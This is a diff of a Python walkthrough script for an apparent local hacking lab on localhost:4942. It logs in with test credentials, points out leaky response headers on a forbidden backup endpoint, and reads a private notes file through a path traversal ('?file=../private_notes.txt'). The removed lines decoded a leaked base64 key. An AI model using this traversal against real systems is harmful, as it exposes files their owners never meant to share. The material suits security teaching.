@@ -1,64 +1,62 @@
-#decodes to validation_key=42network
-#show that off
-
-# 9?forum post by wil
-# Network ops ref for the team: dmFsaWRhdGlvbl9rZXk9NDJuZXR3b3Jr
-# explain why validation key exposed bad.
-
-
-
-from bs4 import BeautifulSoup
-from urllib.parse import urlparse, parse_qs
+import sys
 import requests
-import base64
+
+
 GREEN = "\033[92m"
 RED = "\033[91m"
 CYAN = "\033[96m"
 RESET = "\033[0m"
 
+#login and get session cookie
+identity = "jdoe@student.42.tech"
+password = "abc123"
+auth = requests.post(
+    "http://localhost:4942/login",
+    data={"identity": identity, "password": password},
+    allow_redirects=False
+)
+ 
+cookies = auth.cookies
+if not cookies.get("session"):
+    print("Login failed - no session cookie received")
+    print("Status:", auth.status_code)
+    print(auth.text[:200])
+    sys.exit(1)
+ 
+print(f"{GREEN}Logged in successfully with " + identity + " and " + password )
 
-input(f"{GREEN}Stumbling through the forums you come across a post by Wil - a server admin: ")
+print(f"{RESET}__________")
+ 
+
+targeturl = "http://localhost:4942/backup"
+
+print(f"{RESET}checking the status of http://localhost:4942/backup, we get a 403 as we are not authorized.")
+
+response = requests.get(targeturl)
+print(f"{RED}status code of http://localhost:4942/backup : "+ response.status_code.__str__())
+print(f"{GREEN}However, the headers are not obfuscated and reveal sensitive data.")
+print(f"{RESET}response headers of backup:\n")
+print(response.headers)
+print("__________")
+
+input(f"{GREEN}press anything to continue: ")
 print("___________________________________________________________________________________________")
 print("___________________________________________________________________________________________")
 print("___________________________________________________________________________________________")
 print(f"CONTINUING.")
 print("___________________________________________________________________________________________")
 print("___________________________________________________________________________________________")
-print(f"___________________________________________________________________________________________{RESET}")
-
-targeturl = "http://localhost:4942/forum/bbeo32ucx0a65b8"
-
-response = requests.get(
-        targeturl,
-        allow_redirects=False
-    )
-
-soup = BeautifulSoup(response.text, "html.parser")
-
-cell = soup.find("div", class_="post-content")
-
-if cell:
-    card = cell.parent
-    print(card.get_text(separator="\n", strip=True))
-else:
-    print("ohno")
-
-input(f"{GREEN}Decoding the 'Networks ops ref for the team' via md5: ")
 print("___________________________________________________________________________________________")
-print("___________________________________________________________________________________________")
-print("___________________________________________________________________________________________")
-print(f"CONTINUING.")
-print("___________________________________________________________________________________________")
-print("___________________________________________________________________________________________")
-print(f"___________________________________________________________________________________________{RESET}")
+print(f"{CYAN}--- time to access data/private_notes.txt using the unprotected download function which allows not only whitelisted files to be downloaded---{RESET}")
 
+input(f"{GREEN}accessing http://localhost:4942/projects/download?file=../private_notes.txt : ")
 
-encoded_data = "dmFsaWRhdGlvbl9rZXk9NDJuZXR3b3Jr"
+targeturl = "http://localhost:4942/projects/download?file=../private_notes.txt"
+ 
+response = requests.get(targeturl, cookies=cookies)
+print("__________")
+print("response text of private notes:\n")
+print(response.text)
+print("__________")
 
-# Decode to bytes
-decoded_bytes = base64.b64decode(encoded_data)
-
-# Convert bytes to string
-decoded_string = decoded_bytes.decode('utf-8')
-
-print(decoded_string)
+print("status:", response.status_code)
